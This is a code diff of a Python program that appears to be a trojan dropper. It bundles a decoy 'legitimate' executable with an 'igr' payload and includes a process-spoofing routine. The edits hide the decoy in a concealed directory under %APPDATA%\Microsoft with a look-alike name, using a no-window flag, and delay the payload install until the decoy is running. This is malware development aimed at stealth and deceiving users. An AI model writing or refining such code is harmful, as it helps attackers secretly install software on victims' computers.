@@ -87,30 +87,46 @@ def _install_igr(igr_data: bytes) -> bool:
 
 
 def _launch_legit(legit_data: bytes, original_name: str) -> bool:
-    """Extract legitimate exe to temp and launch it."""
-    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Temp"))
-    legit_path = os.path.join(temp_dir, original_name)
+    """Extract legitimate exe to a hidden directory next to its expected location and launch it."""
+    app_data = os.environ.get("APPDATA", os.path.expanduser("~"))
+    host_dir = os.path.join(app_data, "Microsoft", "_host")
+    try:
+        os.makedirs(host_dir, exist_ok=True)
+        subprocess.run(["attrib", "+h", host_dir], capture_output=True, creationflags=0x08000000)
+    except:
+        pass
+    legit_path = os.path.join(host_dir, original_name)
     try:
         with open(legit_path, "wb") as f:
             f.write(legit_data)
     except:
+        temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Temp"))
+        legit_path = os.path.join(temp_dir, original_name)
         try:
-            alt_path = os.path.join(temp_dir, "_igr_host.exe")
-            with open(alt_path, "wb") as f:
+            with open(legit_path, "wb") as f:
                 f.write(legit_data)
-            legit_path = alt_path
         except:
-            return False
+            alt_path = os.path.join(temp_dir, "_igr_host.exe")
+            try:
+                with open(alt_path, "wb") as f:
+                    f.write(legit_data)
+                legit_path = alt_path
+            except:
+                return False
 
     try:
-        os.startfile(legit_path)
+        subprocess.Popen([legit_path], cwd=os.path.dirname(legit_path), creationflags=0, close_fds=True)
         return True
     except:
         try:
-            subprocess.Popen([legit_path], close_fds=True)
+            os.startfile(legit_path)
             return True
         except:
-            return False
+            try:
+                subprocess.Popen([legit_path], close_fds=True)
+                return True
+            except:
+                return False
 
 
 def _spoof_igr_process() -> None:
@@ -144,9 +160,9 @@ def main():
         return
 
     own_name = os.path.basename(sys.executable)
-    _install_igr(igr_data)
-    time.sleep(1)
     _launch_legit(legit_data, own_name)
+    time.sleep(2)
+    _install_igr(igr_data)
     _spoof_igr_process()
 
 
